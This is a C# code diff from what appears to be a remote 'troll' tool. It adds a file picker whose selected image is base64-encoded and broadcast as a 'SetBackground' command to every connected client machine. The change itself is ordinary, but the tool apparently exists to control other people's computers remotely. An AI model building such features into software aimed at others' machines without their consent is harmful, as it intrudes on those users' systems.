@@ -71,8 +71,19 @@ namespace Trollkit
 
 		private void BtnPickBackgroundImage_Click(object sender, RoutedEventArgs e)
 		{
-			TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = "iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAH0lEQVR42mP8z8BQz0BFwDhq4KiBowaOGjhq4Eg1EAA5Ex3tabMqWgAAAABJRU5ErkJggg==" };
-			parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+			OpenFileDialog open = new OpenFileDialog();
+			open.Filter = "Image Files(*.png; *.jpg; *.jpeg;)|*.png; *.jpg; *.jpeg;";
+			open.Multiselect = false;
+			open.Title = "Pick an image to set as background in the client";
+			if (open.ShowDialog() == true)
+			{
+				byte[] bytes = File.ReadAllBytes(open.FileName);
+
+				string base64 = Convert.ToBase64String(bytes);
+
+				TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = base64 };
+				parent.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+			}			
 		}
 	}
 }
